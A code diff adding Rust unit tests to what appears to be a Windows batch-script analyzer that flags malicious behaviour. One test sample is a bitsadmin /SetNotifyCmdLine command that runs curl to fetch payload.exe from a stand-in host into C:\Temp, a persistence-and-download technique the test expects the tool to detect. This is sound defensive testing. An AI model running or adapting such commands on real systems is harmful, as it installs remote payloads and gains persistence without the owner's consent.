@@ -14040,6 +14040,19 @@ for /F "usebackq tokens=1,2 delims==" %%A in ("config.ini") do echo key=%%A valu
     }
 
     #[test]
+    fn for_f_tokens_star_assigns_remainder_to_next_variable() {
+        let script = br#"echo alpha=one=two>config.ini
+for /F "tokens=1,* delims==" %%A in (config.ini) do echo key=%%A value=%%B
+"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo key=alpha value=one=two"),
+            "got:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_usebackq_dynamic_double_quoted_source_preserves_fallback() {
         let script =
             br#"for /F "usebackq tokens=1,* delims==" %%A in ("%%~i") do echo key=%%A value=%%B"#;
@@ -15623,6 +15636,47 @@ mod bitsadmin_tests {
                 )
             }),
             "BITS notify child command was not recursively analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn bitsadmin_attached_setnotifycmdline_child_command_is_analyzed() {
+        let report = analyze(
+            br#"bitsadmin /SetNotifyCmdLine:job1 cmd.exe "/c curl -o C:\Temp\notify.exe https://bits-attached-notify.example/payload.exe""#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Persistence {
+                        hive,
+                        key,
+                        value_name,
+                        command,
+                    } if hive == "BITS"
+                        && key == "job1"
+                        && value_name == "SetNotifyCmdLine"
+                        && command == r#"cmd.exe /c curl -o C:\Temp\notify.exe https://bits-attached-notify.example/payload.exe"#
+                )
+            }),
+            "attached BITS notify command was not surfaced as persistence: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download {
+                        src,
+                        dst: Some(dst),
+                        ..
+                    } if src == "https://bits-attached-notify.example/payload.exe"
+                        && dst == "C:\\Temp\\notify.exe"
+                )
+            }),
+            "attached BITS notify child command was not recursively analyzed: {:?}",
             report.traits
         );
     }
